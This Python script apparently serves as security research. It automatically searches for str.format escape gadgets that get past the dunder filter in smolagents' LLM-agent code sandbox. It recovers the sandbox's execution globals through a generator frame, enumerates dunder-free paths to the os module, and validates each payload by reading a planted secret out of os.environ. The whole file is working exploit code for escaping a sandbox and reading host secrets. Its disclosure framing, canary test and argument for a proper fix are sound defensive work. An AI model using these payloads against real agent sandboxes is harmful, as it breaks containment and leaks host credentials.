#!/usr/bin/env python
"""Automated str.format escape-gadget synthesizer for AST-filtered Python sandboxes.

Hand-writing one bypass is a trick; this searches for the whole class.

THREAT PRIMITIVE
----------------
`str.format` resolves field names ("{0.a.b[c]}") by doing attribute and item
access *inside CPython's C-level format machinery*, below every Python-level
guard an AST sandbox installs (name checks, import allowlists, call guards,
dunder-attribute blocks). It cannot *call* anything -- only traverse. So it is
an ARBITRARY-READ primitive: from any object the sandbox lets you name, you can
read anything reachable by a chain of getattr / getitem.

WHAT THIS TOOL DOES
-------------------
1. Recovers the sandbox's real execution globals (the dict a generator created
   in-sandbox sees as gi_frame.f_globals) -- exactly what an attacker reaches.
2. Breadth-first searches the live object graph for a target sink (by default
   an `os` module -> os.environ, i.e. host-secret exfiltration), under a
   configurable GUARD POLICY:
       raw        : no restriction (models an unpatched sandbox)
       nodunder   : forbid field segments that are __dunder__  (models
                    smolagents PR #2271 / CVE-2025-* fixes)
3. Renders each path as a concrete str.format payload and VALIDATES it by
   running it through the real sandbox against a planted host canary.

The point it proves: the dunder-block fix leaves an unbounded family of
dunder-free read paths, because the fix never removed the live module objects
from the exec globals. The only real fixes are banning str.format (as
RestrictedPython does) or not seeding reachable modules into the sandbox.
"""
from __future__ import annotations

import argparse
import os
import types
import uuid
from collections import deque
from dataclasses import dataclass, field
from typing import Any


# ----------------------------- guard policies -----------------------------

def is_dunder(name: str) -> bool:
    return name.startswith("__") and name.endswith("__")


POLICIES = {
    "raw": lambda seg: True,                       # anything goes
    "nodunder": lambda seg: not is_dunder(seg),    # smolagents PR #2271 model
}


# ----------------------------- path rendering ------------------------------

@dataclass
class Hop:
    kind: str   # "attr" | "item"
    key: str


def render_field(hops: list[Hop]) -> str:
    """Render a format field body (after the positional index)."""
    out = ""
    for h in hops:
        out += f".{h.key}" if h.kind == "attr" else f"[{h.key}]"
    return out


# ----------------------------- the search ----------------------------------

@dataclass
class Found:
    hops: list[Hop]
    sink: str
    entry: str = ""


# object types we traverse into (reading these is side-effect free)
_SAFE_CONTAINER = (types.ModuleType, types.FrameType, dict)


def _is_os_module(obj: Any) -> bool:
    # canonical os module (__name__ == 'os'); it always carries .environ,
    # unlike the raw 'nt'/'posix' backends which vary by platform.
    return (isinstance(obj, types.ModuleType)
            and getattr(obj, "__name__", "") == "os"
            and hasattr(obj, "environ"))


def _child_items(obj: Any, allowed):
    """Yield (Hop, child) for traversable children of obj, honoring policy."""
    # dict keys (string, policy-allowed, bare-renderable)
    if isinstance(obj, dict):
        for k, v in list(obj.items()):
            if isinstance(k, str) and k.isidentifier() and allowed(k):
                yield Hop("item", k), v
        return
    # attributes
    try:
        names = dir(obj)
    except Exception:  # noqa: BLE001
        return
    for n in names:
        if not allowed(n):
            continue
        # only follow attributes that are modules/frames/dicts or lead to them;
        # read them defensively (skip descriptors with side effects we can't vet)
        try:
            v = getattr(obj, n)
        except Exception:  # noqa: BLE001
            continue
        yield Hop("attr", n), v


def search(root: Any, allowed, max_depth: int = 6, max_nodes: int = 40000,
           sink_pred=_is_os_module) -> list[Found]:
    """BFS from root over getattr/getitem to objects matching sink_pred."""
    found: list[Found] = []
    seen: set[int] = {id(root)}
    q: deque[tuple[Any, list[Hop]]] = deque([(root, [])])
    nodes = 0
    while q and nodes < max_nodes:
        obj, hops = q.popleft()
        nodes += 1
        if len(hops) >= max_depth:
            continue
        for hop, child in _child_items(obj, allowed):
            if sink_pred(child):
                found.append(Found(hops + [hop], "os-module"))
                continue
            if isinstance(child, _SAFE_CONTAINER) and id(child) not in seen:
                seen.add(id(child))
                q.append((child, hops + [hop]))
    return found


# ----------------------- sandbox plumbing (smolagents) ----------------------

def sandbox_globals():
    """Recover the real LocalPythonExecutor exec-globals as an in-sandbox
    generator sees them (gi_frame.f_globals)."""
    from smolagents.local_python_executor import LocalPythonExecutor
    ex = LocalPythonExecutor(additional_authorized_imports=[])
    for setter in ("send_tools", "send_variables"):
        fn = getattr(ex, setter, None)
        if fn:
            try:
                fn({})
            except Exception:  # noqa: BLE001
                pass
    ex("g = (x for x in (1,))")
    gen = ex.state["g"]
    return ex, gen.gi_frame.f_globals


def validate(payload_field: str) -> tuple[bool, str]:
    """Run the synthesized payload through a FRESH real smolagents sandbox and
    check the planted host canary comes back. payload_field is the text after
    the positional 0, e.g. '.gi_frame.f_globals[inspect].os.environ[HOST_SECRET]'."""
    from harness.frameworks import SmolagentsLocalAdapter
    code = ("print('{0" + payload_field + "}'.format((x for x in (1,))))")
    r = SmolagentsLocalAdapter().run_code(code)
    tok = os.environ.get("HOST_SECRET", "")
    ok = bool(tok) and tok in (r.stdout or "")
    return ok, (r.stdout or r.stderr or "").strip()[:80]


# --------------------------------- main ------------------------------------

def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--policy", choices=list(POLICIES), default="nodunder",
                    help="guard policy to synthesize against (default: nodunder = PR #2271)")
    ap.add_argument("--depth", type=int, default=6)
    ap.add_argument("--max", type=int, default=12, help="max gadgets to report")
    args = ap.parse_args()

    token = "HOSTCANARY-" + uuid.uuid4().hex
    os.environ["HOST_SECRET"] = token
    allowed = POLICIES[args.policy]

    ex, fg = sandbox_globals()
    print(f"[*] sandbox exec-globals recovered: {len(fg)} names")
    print(f"[*] guard policy: {args.policy}"
          + ("  (dunder field segments FORBIDDEN -- models smolagents PR #2271)"
             if args.policy == "nodunder" else ""))

    # Search per top-level f_globals entry so we enumerate DISTINCT routes
    # (all reach the same singleton os module, but via independent modules).
    base = [Hop("attr", "gi_frame"), Hop("attr", "f_globals")]
    routes: list[Found] = []
    for key, val in list(fg.items()):
        if not (isinstance(key, str) and key.isidentifier() and allowed(key)):
            continue
        if not isinstance(val, _SAFE_CONTAINER):
            continue
        hits = search(val, allowed, max_depth=args.depth, sink_pred=_is_os_module)
        if hits:
            # shortest route through this entry
            best = min(hits, key=lambda f: len(f.hops))
            full = base + [Hop("item", key)] + best.hops
            routes.append(Found(full, "os.environ", entry=key))

    routes.sort(key=lambda f: len(f.hops))
    print(f"[*] discovered {len(routes)} distinct dunder-free routes to an os module\n")

    working = 0
    for f in routes[: args.max]:
        field = render_field(f.hops) + ".environ[HOST_SECRET]"
        ok, sample = validate(field)
        working += ok
        flag = "VALID " if ok else "fail  "
        print(f"  [{flag}] via f_globals[{f.entry}]  (len {len(f.hops)})")
        print(f"            {{0{field}}}")
        if ok:
            print(f"            -> leaked: {sample}")
    print(f"\n[*] {working}/{min(len(routes), args.max)} synthesized payloads "
          f"VALIDATED against the real smolagents sandbox")
    print("[*] each is a host-secret read that passes the PR #2271 dunder filter.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
